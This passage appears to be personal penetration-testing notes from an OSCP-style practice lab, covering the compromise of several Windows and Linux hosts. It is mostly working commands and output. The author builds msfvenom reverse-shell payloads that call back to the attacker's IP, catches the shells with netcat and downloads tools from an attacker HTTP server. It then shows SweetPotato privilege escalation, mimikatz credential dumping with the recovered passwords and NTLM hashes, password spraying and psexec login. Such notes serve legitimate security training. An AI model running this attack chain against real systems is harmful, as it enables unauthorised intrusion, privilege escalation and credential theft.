└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.49.123 LPORT=80 -f war -o shell.war
Payload size: 1091 bytes
Final size of war file: 1091 bytes
Saved as: shell.war
```

![[Pasted image 20240425010330.png]]

5. Upload shell.war file. Run it buy clicking the /shell path. And obtained reverse shell. 
![[Pasted image 20240425010420.png]]

![[Pasted image 20240425010441.png]]

```  
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ nc -lvnp 80  
listening on [any] 80 ...
connect to [192.168.49.123] from (UNKNOWN) [192.168.123.101] 52218
Microsoft Windows [Version 10.0.17763.4010]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\Apache Software Foundation\Tomcat 8.5>cd ..
cd ..

C:\Program Files\Apache Software Foundation>cd ..
cd ..

C:\Program Files>cd ..
cd ..

C:\>whoami
whoami
oscp\lisa
```

![[Pasted image 20240425010523.png]]

6. Obtained local.txt under lisa's desktop
```
PS C:\Users\lisa\Desktop> type local.txt
type local.txt
73bd3b60317feb07e47c20bf27482399
PS C:\Users\lisa\Desktop> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.123.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.123.254
PS C:\Users\lisa\Desktop> whoami
whoami
oscp\lisa
```

![[Pasted image 20240425010720.png]]

7. Checked out current user privileges. Found out enabled privilege 'SeImpersonatePrivilege'
```
PS C:\Users\lisa> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

![[Pasted image 20240425010937.png]]

8. Use sweetpotato.exe for privilege escalation. Transferred and then exploit. Also created r.exe malicious file. 
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.123.101 - - [24/Apr/2024 11:03:37] "GET /SweetPotato.exe HTTP/1.1" 200 -

PS C:\Users\lisa> iwr -uri http://192.168.49.108:80/SweetPotato.exe -Outfile SweetPotato.exe

```

![[Pasted image 20240425011120.png]]
![[Pasted image 20240425011559.png]]

```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.123 LPORT=80 -f exe -o r.exe   
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: r.exe

┌──(kali㉿kali)-[~/OSCP/exam]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.123.101 - - [24/Apr/2024 11:04:52] "GET /r.exe HTTP/1.1" 200 -

PS C:\Users\lisa> iwr -uri http://192.168.49.108:80/r.exe -Outfile r.exe
```

![[Pasted image 20240425011408.png]]
![[Pasted image 20240425011427.png]]
![[Pasted image 20240425011159.png]]

9. Run the sweet potato and obtained proof.txt
```
PS C:\Users\lisa> .\SweetPotato.exe -e EfsRpc -p r.exe
.\SweetPotato.exe -e EfsRpc -p r.exe
SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
[+] Attempting NP impersonation using method EfsRpc to launch r.exe
[+] Triggering name pipe access on evil PIPE \\localhost/pipe/b2fcdc98-a328-4104-9e2d-509a29db0bd3/\b2fcdc98-a328-4104-9e2d-509a29db0bd3\b2fcdc98-a328-4104-9e2d-509a29db0bd3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!
```

![[Pasted image 20240425012034.png]]

![[Pasted image 20240425011736.png]]

```
C:\Windows\system32>whoami
whoami
nt authority\system

PS C:\Users\Administrator\Desktop> type proof.txt
type proof.txt
913661b0c391753ab0ae6f784b19db03
PS C:\Users\Administrator\Desktop> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.123.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.123.254
PS C:\Users\Administrator\Desktop> whoami
whoami
nt authority\system
```

![[Pasted image 20240425011941.png]]

10. Post-exploitation: Transfer mimikatz.exe and then run it.  
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.123.101 - - [24/Apr/2024 11:07:57] "GET /mimikatz.exe HTTP/1.1" 200 -


PS C:\Users\Administrator\Desktop> iwr -uri http://192.168.49.123:80/mimikatz.exe -Outfile mimikatz.exe

```

![[Pasted image 20240425012210.png]]

![[Pasted image 20240425012251.png]]

```
PS C:\Users\Administrator\Desktop> .\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
```

![[Pasted image 20240425012331.png]]

11. Obtained lisa passwords. 
```
         * Username : lisa
         * Domain   : OSCP.EXAM
         * Password : Seems2Easy4Me
```

![[Pasted image 20240425012441.png]]


11. Check out the Notes.db from 'Simple Sticky Notes' from documents. Found out 'svc_sql' user creds
```
PS C:\Users\Administrator\Documents\Simple Sticky Notes> type NOtes.db

svc_sql: Hard2Work4Style8
```

![[Pasted image 20240425012758.png]]

![[Pasted image 20240425012826.png]]
### 192.168.123.102

1. Rustscan and Nmap 
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ rustscan 192.168.123.102
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.123.102:135
Open 192.168.123.102:139
Open 192.168.123.102:445
Open 192.168.123.102:1433
Open 192.168.123.102:5985
Open 192.168.123.102:49665
Open 192.168.123.102:49666
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 135,139,445,1433,5985,49665,49666 192.168.123.102

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 02:24 EDT
Initiating Ping Scan at 02:24
Scanning 192.168.123.102 [2 ports]
Completed Ping Scan at 02:24, 3.00s elapsed (1 total hosts)
Nmap scan report for 192.168.123.102 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.03 seconds

┌──(kali㉿kali)-[~/OSCP/exam]
└─$ nmap -A -T4 -p 135,139,445,1433,5985,49665,49666 192.168.123.102 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 02:26 EDT
Nmap scan report for 192.168.123.102
Host is up (0.26s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2024-04-24T06:27:47+00:00; -1s from scanner time.
| ms-sql-ntlm-info: 
|   192.168.123.102:1433: 
|     Target_Name: oscp
|     NetBIOS_Domain_Name: oscp
|     NetBIOS_Computer_Name: MS02
|     DNS_Domain_Name: oscp.exam
|     DNS_Computer_Name: ms02.oscp.exam
|     DNS_Tree_Name: oscp.exam
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-01-17T19:18:13
|_Not valid after:  2054-01-17T19:18:13
| ms-sql-info: 
|   192.168.123.102:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-04-24T06:27:11
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.57 seconds

```


![[Pasted image 20240425005615.png]]

![[Pasted image 20240425005638.png]]

2. Spray svc_sql user creds. 
``` 
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ netexec smb 192.168.123.100-102 -u svc_sql -p Hard2Work4Style8                   
SMB         192.168.123.102 445    MS02             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         192.168.123.100 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:False)
SMB         192.168.123.101 445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         192.168.123.102 445    MS02             [+] oscp.exam\svc_sql:Hard2Work4Style8 (Pwn3d!)
SMB         192.168.123.100 445    DC01             [+] oscp.exam\svc_sql:Hard2Work4Style8 
SMB         192.168.123.101 445    MS01             [-] oscp.exam\svc_sql:Hard2Work4Style8 STATUS_TRUSTED_RELATIONSHIP_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

![[Pasted image 20240425012941.png]]

3. Logged in using impacket-psexec
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ impacket-psexec svc_sql:'Hard2Work4Style8'@192.168.123.102          
Impacket v0.12.0.dev1+20240327.181547.f8899e6 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.123.102.....
[*] Found writable share ADMIN$
[*] Uploading file CeThvkHP.exe
[*] Opening SVCManager on 192.168.123.102.....
[*] Creating service tqaq on 192.168.123.102.....
[*] Starting service tqaq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4010]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

4. Obtained Local.txt and Proof.txt
```
PS C:\Users\svc_sql\Desktop> type local.txt
9f428a4e2949c2922d542e1ade9bf0e3
ipconfig
PS C:\Users\svc_sql\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.123.102
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.123.254

```

![[Pasted image 20240425013307.png]]

```
C:\Users\Administrator\Desktop> type proof.txt
f99c7ba534bc45e0265ac54ee1fad636

PS C:\Users\Administrator\Desktop> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.123.102
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.123.254
```

![[Pasted image 20240425013548.png]]

5. Post exploitation - check out other user hashes using mimikatz. Obtained betty information
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.123.102 - - [24/Apr/2024 12:16:23] "GET /mimikatz.exe HTTP/1.1" 200 -

PS C:\Users\Administrator\Desktop> iwr -uri http://192.168.49.108:80/mimikatz.exe -Outfile mimikatz.exe

```

![[Pasted image 20240425013749.png]]

![[Pasted image 20240425013831.png]]

```
PS C:\Users\Administrator\Desktop> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

privilege::debug
mimikatz # Privilege '20' OK

sekurlsa::logonpasswords



         * Username : betty
         * Domain   : oscp
         * NTLM     : fa680f1c00205958367965bd2102e92c
         * SHA1     : 582cbcfc9ceea7b5a3d3b4598d00b23df2cde9b8
         * DPAPI    : 86604e46420e402d32d62f74e58e59db
```


![[Pasted image 20240425013924.png]]

![[Pasted image 20240425014008.png]]


# 12

```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ nmap -A -T4 -p 22,80,139,445 192.168.123.112
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 20:56 EDT
Nmap scan report for 192.168.123.112
Host is up (0.25s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 47:a0:75:72:a5:53:d8:ed:6d:b4:7f:a9:b4:f3:d1:6a (ECDSA)
|_  256 e7:78:17:d1:b7:d9:33:1e:b0:98:0c:72:69:5a:8e:2e (ED25519)
80/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Website in Construction
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s
| smb2-time: 
|   date: 2024-04-25T00:56:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.77 seconds

three user name

```


## 11 
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ nmap -A -T4 -p 80,135,139,443,445,3389 192.168.123.111
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 05:03 EDT
Nmap scan report for 192.168.123.111
Host is up (0.26s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-generator: Nicepage 5.13.1, nicepage.com
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Home
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2023-08-24T08:19:45
|_Not valid after:  2023-11-22T08:19:45
|_ssl-date: 2023-09-15T15:06:21+00:00; -221d17h58m09s from scanner time.
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
|_http-title: Home
|_http-generator: Nicepage 5.13.1, nicepage.com
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=oscp
| Not valid before: 2023-09-14T12:17:25
|_Not valid after:  2024-03-15T12:17:25
|_ssl-date: 2023-09-15T15:06:21+00:00; -221d17h58m09s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: oscp
|   DNS_Computer_Name: oscp
|   Product_Version: 10.0.17763
|_  System_Time: 2023-09-15T15:05:42+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -221d17h58m09s, deviation: 0s, median: -221d17h58m09s
| smb2-time: 
|   date: 2023-09-15T15:05:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.74 seconds
```

## 10
```
                                                                   
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ nmap -T4 -A -p 22,21 192.168.123.110              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-25 01:09 EDT
Nmap scan report for localhost (192.168.123.110)
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.49.123
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0            4096 Jun 02  2023 db
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8b:81:8c:c9:d8:f9:8d:cf:94:04:98:57:a1:ea:69:c3 (ECDSA)
|_  256 51:8a:c9:94:5f:37:dd:34:fc:32:02:43:12:78:0f:d7 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .


──(kali㉿kali)-[~/OSCP/exam]
└─$ sudo nmap -sU -p 161 -sC 192.168.123.110 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-25 01:22 EDT
Nmap scan report for localhost (192.168.123.110)
Host is up (0.26s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: a58fd418f819ea6300000000
|   snmpEngineBoots: 21
|_  snmpEngineTime: 4h34m57s

Nmap done: 1 IP address (1 host up) scanned in 17.16 seconds
```
